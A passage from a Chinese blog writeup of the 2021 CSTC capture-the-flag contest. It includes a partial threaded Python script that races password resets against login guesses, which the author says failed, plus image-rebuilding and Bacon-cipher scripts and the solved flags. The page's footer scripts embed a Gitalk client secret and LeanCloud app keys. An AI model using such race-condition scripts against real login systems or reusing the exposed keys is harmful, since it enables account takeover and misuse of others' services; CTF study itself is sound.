class="line">    sha1.update(gmdate)</span><br><span class="line">    passwd = sha1.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">    <span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag, passwd</span><br><span class="line">    loginData = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>: passwd,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(resetPassUrl, loginData)</span><br><span class="line">    <span class="keyword">if</span> res.headers.get(<span class="string">&#x27;Cookie&#x27;</span>, <span class="number">0</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(passwd)</span><br><span class="line">        <span class="built_in">print</span>(res.headers)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=resetPasswd)</span><br><span class="line">    b = threading.Thread(target=login)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure>
+
+<p>不太行。。后面利用大概是有思路了，卡在登录这。。。</p>
+<h2 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h2><p>文件为RGB三原色组合，尝试还原图片</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Crack</span>(<span class="params">n</span>):</span></span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(n **<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(n % each == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(each,<span class="built_in">int</span>(n/each))</span><br><span class="line">            flag += [(each,<span class="built_in">int</span>(n/each))]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">1</span>:<span class="keyword">return</span> flag[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        choice = <span class="built_in">input</span>(<span class="string">&quot;选择第几组(0-%s):&quot;</span>%(<span class="built_in">len</span>(flag)-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> flag[<span class="built_in">int</span>(choice)]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Paint</span>(<span class="params">X,Y,listrgb</span>):</span></span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(X, Y))</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,X):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,Y):</span><br><span class="line">            temp = listrgb[i].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            pic.putpixel([x,y],(<span class="built_in">int</span>(temp[<span class="number">0</span>]),<span class="built_in">int</span>(temp[<span class="number">1</span>]),<span class="built_in">int</span>(temp[<span class="number">2</span>])))</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">    pic.show()</span><br><span class="line">    <span class="comment">#pic.save(&quot;./flag%s.png&quot;%(X))</span></span><br><span class="line">listrgb = <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>).readlines()</span><br><span class="line">X,Y = Crack(<span class="built_in">len</span>(listrgb))</span><br><span class="line">Paint(X,Y,listrgb)</span><br><span class="line">Paint(Y,X,listrgb)</span><br></pre></td></tr></table></figure>
+
+<p>跑一下脚本选择第 12 组，然后水平翻转一下即可。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620191121792-b6b66454-9f04-4ceb-8f90-1b0a75a919c1.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620191121792-b6b66454-9f04-4ceb-8f90-1b0a75a919c1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>flag{c1d836d1db9d42dd}</p>
+<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>压缩包密码爆破得 <code>ff123</code></p>
+<p>readme.txt 。尝试摩斯密码和培根密码，发现是培根密码，跑跑脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">table = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;aaaaa&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;aaaab&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;aaaba&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;aaabb&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;aabaa&#x27;</span>, <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;aabab&#x27;</span>, <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;aabba&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;aabbb&#x27;</span>, <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;abaaa&#x27;</span>, <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;abaab&#x27;</span>, <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;ababa&#x27;</span>, <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;ababb&#x27;</span>, <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;abbaa&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;abbab&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;abbba&#x27;</span>, <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;abbbb&#x27;</span>, <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;baaaa&#x27;</span>, <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;baaab&#x27;</span>, <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;baaba&#x27;</span>, <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;baabb&#x27;</span>, <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;babaa&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;babab&#x27;</span>, <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;babba&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;babbb&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;bbaaa&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;bbaab&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bacon</span>(<span class="params">cipher</span>):</span></span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    codes = re.findall(<span class="string">r&#x27;.&#123;5&#125;&#x27;</span>, cipher)</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> codes:</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            msg += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            UNCODE = <span class="built_in">dict</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> t: (t[<span class="number">1</span>], t[<span class="number">0</span>]), table.items()))</span><br><span class="line">            msg += UNCODE[code]</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cipher = <span class="string">&#x27;BABBBBBAAAABAAB&#x27;</span></span><br><span class="line">    cipher = cipher.lower()</span><br><span class="line">    plaintext = bacon(cipher)</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
+
+<p>解出来得知 word 文档密码 <code>xyj</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620187683454-3a74fedf-ad0c-406a-9307-40035bf08bfd.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620187683454-3a74fedf-ad0c-406a-9307-40035bf08bfd.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>颜色隐藏获取 flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}</p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://tari.moe/2021/05/06/2021CSTC-ctf/>https://tari.moe/2021/05/06/2021CSTC-ctf/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/ctf/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>ctf</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%AF%94%E8%B5%9B/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>比赛</p></a></div>
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/05/04/ctfshow-nodejs/'>
+          <p class='title'>ctfshow nodejs篇<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>
+
+web342 很刺激 （
+感觉对原型链污染理解又加深了呢~
+web334 JS 大小写特性搜集了半天信息，发现题目描述处有源码可以直接下载。。
+user.js
+12345module.exp...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="gitalk-container"></div>
+
+  </article>
+
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>文档目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1"><span class="toc-text">web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-text">web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-text">web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RGB"><span class="toc-text">RGB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip"><span class="toc-text">zip</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="2021CSTC网络安全技术大赛 Writeup (持续更新)";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        
+          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
+</div>
+        
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2021 TARI TARI</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/issues.min.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+  function pjax_gitalk() {
+    if(!document.querySelectorAll("#gitalk-container")[0])return;
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    if (document.getElementById('gitalk-container') != null) {
+      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tari0510.github.io","owner":"TARI0510","admin":["TARI0510"],"path":null}, {
+	  id: path,
+	  distractionFreeMode: false  // Facebook-like distraction free mode
+    }));
+      gitalk.render('gitalk-container');
+    }
+  }
+  $(function () {
+    pjax_gitalk();
+  });
+  volantis.pjax.push(pjax_gitalk);
+</script>
+
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/app.min.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.1/source/js/search/hexo.min.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
+    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://tari.moe' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
